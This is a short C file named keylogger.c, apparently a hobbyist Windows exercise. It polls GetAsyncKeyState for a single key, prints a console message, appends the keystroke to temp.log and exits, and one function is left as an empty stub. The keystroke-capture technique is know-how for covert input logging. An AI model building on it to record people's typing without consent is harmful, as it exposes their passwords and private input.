/*   keylogger.c
*
*   A simple program that keeps a log of all keystrokes entered
*   after program has been executed.
*
*   Mainly written to test writing windows-specific programs and
*   the GitHub for Windows client.
*
*   ALG:
*       1. Create an empty file to store values entered
*       2. Log keystrokes (GetAsyncKeyState() function in windowsl lib)
*       3. Store values in file
*
*/

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <assert.h>
#include "main.h"

void checkKeys();

int main() {

    printf("number: %d\n", NUMBER);

    FILE *file = fopen("temp.log", "a+");
    assert(file);

    while (TRUE) {

        if (GetAsyncKeyState(0x32)) {
            printf("the number 2 has been pressed\n");
            fprintf(file, "%d", 2);

            Sleep(100);         // Pause for a second
            break;
        }

        Sleep(10);      // 10 ms delay between keystrokes
    }
    fclose(file);

    return 0;
}

void checkKeys() {

    // Numbers
    if (GetAsyncKeyState(0x30)) {

    }

}
